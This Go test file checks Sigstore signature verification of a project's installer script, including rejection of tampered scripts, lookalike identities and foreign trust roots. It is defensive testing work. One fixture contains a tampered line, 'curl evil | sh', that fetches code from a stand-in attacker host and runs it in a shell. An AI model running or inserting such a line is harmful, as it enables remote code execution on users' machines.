package main

import (
	"testing"

	"github.com/sigstore/sigstore-go/pkg/testing/ca"
	"github.com/stretchr/testify/require"
)

// releaseIdentity is a SAN the production policy must accept: this repo's
// release workflow running on a version tag.
const releaseIdentity = "https://github.com/arctop/seamless/.github/workflows/release.yml@refs/tags/v0.6.0"

// signedScript signs script with a virtual Sigstore (its own Fulcio and Rekor)
// under the given identity/issuer and returns the CA for use as trusted
// material. The entity feeds verifyInstallerEntity directly -- the same
// verifier construction and identity policy the production path runs, minus
// only bundle-JSON parsing, which TestVerifyInstallerBundle covers separately.
func signedScript(t *testing.T, identity, issuer string, script []byte) (*ca.VirtualSigstore, *ca.TestEntity) {
	t.Helper()
	virtual, err := ca.NewVirtualSigstore()
	require.NoError(t, err)
	entity, err := virtual.Sign(identity, issuer, script)
	require.NoError(t, err)
	return virtual, entity
}

func TestVerifyInstallerEntity_AcceptsReleaseWorkflowSignature(t *testing.T) {
	script := []byte("#!/bin/sh\necho seamless\n")
	virtual, entity := signedScript(t, releaseIdentity, signingIssuer, script)
	require.NoError(t, verifyInstallerEntity(virtual, entity, script))
}

func TestVerifyInstallerEntity_RejectsTamperedScript(t *testing.T) {
	script := []byte("#!/bin/sh\necho seamless\n")
	virtual, entity := signedScript(t, releaseIdentity, signingIssuer, script)
	tampered := []byte("#!/bin/sh\necho seamless\ncurl evil | sh\n")
	err := verifyInstallerEntity(virtual, entity, tampered)
	require.Error(t, err)
	require.Contains(t, err.Error(), "sigstore verification")
}

func TestVerifyInstallerEntity_RejectsForeignIdentity(t *testing.T) {
	script := []byte("#!/bin/sh\necho seamless\n")
	tests := []struct {
		name     string
		identity string
		issuer   string
	}{
		{"another repo", "https://github.com/evil/seamless/.github/workflows/release.yml@refs/tags/v0.6.0", signingIssuer},
		{"another workflow file", "https://github.com/arctop/seamless/.github/workflows/ci.yml@refs/tags/v0.6.0", signingIssuer},
		{"branch ref, not a tag", "https://github.com/arctop/seamless/.github/workflows/release.yml@refs/heads/main", signingIssuer},
		// The pre-move signer (plan:move-to-arctop). update only ever verifies
		// the latest release's installer, which is arctop-signed, so the old
		// org's release workflow is as foreign here as any other repo's. The
		// installers, not this check, keep accepting it for pinned old versions.
		{"pre-move org 0spoon", "https://github.com/0spoon/seamless/.github/workflows/release.yml@refs/tags/v0.5.4", signingIssuer},
		// The org and repo must stay anchored on both sides: a lookalike org or
		// repo name that merely starts with the allowed one is foreign.
		{"lookalike org arctopx", "https://github.com/arctopx/seamless/.github/workflows/release.yml@refs/tags/v0.6.0", signingIssuer},
		{"lookalike org 0spoon-evil", "https://github.com/0spoon-evil/seamless/.github/workflows/release.yml@refs/tags/v0.6.0", signingIssuer},
		{"lookalike repo seamless-fork", "https://github.com/arctop/seamless-fork/.github/workflows/release.yml@refs/tags/v0.6.0", signingIssuer},
		{"wrong issuer", releaseIdentity, "https://accounts.google.com"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			virtual, entity := signedScript(t, tt.identity, tt.issuer, script)
			err := verifyInstallerEntity(virtual, entity, script)
			require.Error(t, err)
			require.Contains(t, err.Error(), "sigstore verification")
		})
	}
}

// A signature that chains to a DIFFERENT sigstore (someone else's Fulcio and
// Rekor) must fail against ours even when the certificate claims the right
// identity -- the trusted root, not the SAN string, is the anchor.
func TestVerifyInstallerEntity_RejectsForeignTrustRoot(t *testing.T) {
	script := []byte("#!/bin/sh\necho seamless\n")
	trustedCA, _ := signedScript(t, releaseIdentity, signingIssuer, script)
	_, foreignEntity := signedScript(t, releaseIdentity, signingIssuer, script)
	err := verifyInstallerEntity(trustedCA, foreignEntity, script)
	require.Error(t, err)
}

func TestVerifyInstallerBundle_RejectsMalformedJSON(t *testing.T) {
	virtual, err := ca.NewVirtualSigstore()
	require.NoError(t, err)
	for _, junk := range []string{"", "{", `{"mediaType":"nonsense"}`, "not json at all"} {
		err := verifyInstallerBundle(virtual, []byte(junk), []byte("script"))
		require.Error(t, err, "bundle %q must not parse", junk)
	}
}

// The embedded production trusted root must stay parseable, or every update
// would fail closed at runtime with no test having noticed.
func TestSigstoreTrustedRoot_EmbeddedSnapshotParses(t *testing.T) {
	tr, err := sigstoreTrustedRoot()
	require.NoError(t, err)
	require.NotEmpty(t, tr.FulcioCertificateAuthorities())
	require.NotEmpty(t, tr.RekorLogs())
}
